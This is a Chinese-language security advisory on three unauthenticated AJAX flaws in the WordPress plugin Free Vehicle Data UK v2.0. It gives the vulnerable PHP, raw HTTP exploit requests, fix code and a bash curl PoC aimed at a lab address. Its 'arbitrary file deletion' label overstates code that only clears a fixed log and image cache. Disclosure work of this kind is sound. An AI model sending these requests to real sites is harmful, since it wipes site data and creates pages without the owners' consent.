## 插件信息

| 项目 | 内容 |
|-----|------|
| **插件名称** | free-vehicle-data-uk (Rapid Car Check) |
| **版本** | v2.0 |
| **供应商** | [Rapid Car Check](https://wordpress.org/plugins/free-vehicle-data-uk/) |
| **目标站点** | http://192.168.190.129/ |
| **审计时间** | 2026-03-26 |

---

## 漏洞概览

| # | 漏洞类型 | 严重程度 | 需要认证 | CVSS |
|---|---------|---------|---------|------|
| 1 | 任意文件删除 (ClearSearchLogs) | 🔴 Critical | ❌ 否 | 8.1 |
| 2 | 任意文件删除 (ClearImages) | 🔴 Critical | ❌ 否 | 8.1 |
| 3 | 任意页面创建 (CreatePages) | 🟠 High | ❌ 否 | 7.3 |

---

## 漏洞详情

### 漏洞 1：未授权任意文件删除 (ClearSearchLogs)

**漏洞位置：** `classes/Ajax.php`

**漏洞代码：**
```php
public function ClearSearchLogs(){
    $aAnswer = ['messages'=>['Vehicle search log was deleted!'],'html'=>''];
    $upload_dir = wp_upload_dir();
    $log_file = $upload_dir['basedir'] . '/free-vehicle-data-uk/log.txt';
    file_put_contents($log_file, '');  // 清空日志文件
    wp_send_json($aAnswer);
}
```

**漏洞原因：**
- 使用 `wp_ajax_nopriv_FVD_ClearSearchLogs` - 无需登录即可访问
- 无权限检查
- 无 Nonce 验证

#### 复现步骤

**Step 1: 发送请求**

```http
POST /wp-admin/admin-ajax.php?action=FVD_ClearSearchLogs HTTP/1.1
Host: 192.168.190.129
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

**Step 2: 响应结果**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: application/json

{"messages":["Vehicle search log was deleted!"],"html":""}


```
![image](https://github.com/BigTiger2020/2026/blob/main/20260326-104128.jpg)
---

### 漏洞 2：未授权任意文件删除 (ClearImages)

**漏洞位置：** `classes/Ajax.php`

**漏洞代码：**
```php
public function ClearImages(){
    $aAnswer = ['messages'=>['Local image cache files have been deleted!'],'html'=>''];
    $upload_dir = wp_upload_dir();
    $image_dir = $upload_dir['basedir'] . '/free-vehicle-data-uk/vehicleimages/';
    if (file_exists($image_dir)) {
        $imagefiles = glob($image_dir . '*');
        foreach ($imagefiles as $imagefile){
            if (is_file($imagefile)) {
                unlink($imagefile);  // 删除所有图片文件
            }
        }
    }
    wp_send_json($aAnswer);
}
```

**漏洞原因：**
- 使用 `wp_ajax_nopriv_FVD_ClearImages` - 无需登录即可访问
- 无权限检查
- 无 Nonce 验证

#### 复现步骤

**Step 1: 发送请求**

```http
POST /wp-admin/admin-ajax.php?action=FVD_ClearImages HTTP/1.1
Host: 192.168.190.129
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

**Step 2: 响应结果**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: application/json

{"messages":["Local image cache files have been deleted!"],"html":""}
```
![image](https://github.com/BigTiger2020/2026/blob/main/20260326-104144.jpg)
---

### 漏洞 3：未授权任意页面创建 (CreatePages)

**漏洞位置：** `classes/Ajax.php`

**漏洞代码：**
```php
public function CreatePages(){
    global $wp_filesystem;
    
    // 无权限检查
    // 无 Nonce 验证
    
    $aTemplates = [
        ['id'=>0,'url'=>'','title'=>'Two Column FVD Demo','file'=>'2-col-layout.php'],
        ['id'=>0,'url'=>'','title'=>'One Column FVD Demo','file'=>'1-col-layout.php'],
        // ... 更多模板
    ];

    foreach($aTemplates as $aTemplate){
        $iPageID = wp_insert_post($aArgs);  // 创建页面
    }
    
    wp_send_json($aAnswer);
}
```

**漏洞原因：**
- 使用 `wp_ajax_nopriv_FVD_CreatePages` - 无需登录即可访问
- 无权限检查
- 无 Nonce 验证

#### 复现步骤

**Step 1: 发送请求**

```http
POST /wp-admin/admin-ajax.php?action=FVD_CreatePages HTTP/1.1
Host: 192.168.190.129
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

**Step 2: 响应结果**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: application/json

{
  "messages": ["Your demo pages have been imported"],
  "html": "<div class=\"notice notice-success is-dismissible\">\n<p><strong>Free Vehicle Data UK:</strong><br>Your demo pages have been imported, Click through the demo pages below to see which one best matches your needs!\n    <br><br>\n    <h3>2 Column Demo Pages Imported:</h3>\n    <strong>[Plain] Two Column Demo Page Created!</strong><br> \n    >> <a href=\"http://192.168.190.129/index.php/two-column-fvd-demo/?Reg=FY60KGG\" target=\"_blank\">View Two Column Plain Demo Page</a> - Vehicle Search Box ShortCode:<strong> [fvd_searchbox page=http://192.168.190.129/index.php/two-column-fvd-demo/?Reg=FY60KGG]</strong>\t\n    <br><br>\n    <strong>[ALT] Two Column Demo Page Created!</strong><br> \n    >> <a href=\"http://192.168.190.129/index.php/one-column-fvd-demo/?Reg=FY60KGG\" target=\"_blank\">View Two Column ALT Demo Page</a>\n    <br><br>\n    <strong>[ALT V2] Two Column Demo Page Created!</strong><br> \n    >> <a href=\"http://192.168.190.129/index.php/two-column-alt-fvd-demo/?Reg=FY60KGG\" target=\"_blank\">View Two Column ALT V2 Demo Page</a>\n    <br><br>\n    <h3>1 Column Demo Pages Imported:</h3>\t\n    <strong>One Column Demo Page Created!</strong><br> \n    >> <a href=\"http://192.168.190.129/index.php/two-column-alt-fvd-demo-alt-img/?Reg=FY60KGG\" target=\"_blank\">View One Column Demo Page</a>\n    </p></div>"
}
```

**Step 3: 验证页面已创建**

```http
GET /index.php/two-column-fvd-demo/ HTTP/1.1
Host: 192.168.190.129

HTTP/1.1 200 OK
```

---
![image](https://github.com/BigTiger2020/2026/blob/main/ScreenShot_2026-03-26_104912_329.png)
## 修复建议

### 1. 添加权限检查

```php
// 在 Ajax.php 中添加权限检查
public function ClearSearchLogs(){
    // 添加权限检查
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized', 403);
    }
    // ... 原有代码
}

public function ClearImages(){
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized', 403);
    }
    // ... 原有代码
}

public function CreatePages(){
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized', 403);
    }
    // ... 原有代码
}
```

### 2. 添加 Nonce 验证

```php
// 在 AJAX 处理前验证 nonce
add_action('wp_ajax_nopriv_FVD_CreatePages', function() {
    check_ajax_referer('fvd_security_nonce', 'nonce');
    // ... 处理代码
});
```

### 3. 禁用 nopriv 动作

```php
// 将 wp_ajax_nopriv_* 改为 wp_ajax_*
// 只允许已登录用户访问
add_action('wp_ajax_FVD_CreatePages', [$this, 'CreatePages'], 9999);
// 删除: add_action('wp_ajax_nopriv_FVD_CreatePages', ...
```

---

## POC 脚本

```bash
#!/bin/bash
#=====================================
# Free Vehicle Data UK v2.0 - POC
# Unauthenticated Vulnerabilities
#=====================================

TARGET="http://192.168.190.129"

echo "======================================"
echo "Free Vehicle Data UK v2.0 POC"
echo "======================================"

echo ""
echo "[*] Test 1: Clear Search Logs (Arbitrary File Deletion)"
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php?action=FVD_ClearSearchLogs"
echo ""

echo ""
echo "[*] Test 2: Clear Images (Arbitrary File Deletion)"
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php?action=FVD_ClearImages"
echo ""

echo ""
echo "[*] Test 3: Create Pages (Arbitrary Content Creation)"
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php?action=FVD_CreatePages"
echo ""

echo ""
echo "======================================"
echo "POC Complete"
echo "======================================"
```

---

## 参考

- **漏洞类型:** Arbitrary File Deletion, Arbitrary Content Creation
- **安装量要求:** >= 200 (现役安装)

---

*报告生成时间: 2026-03-26*
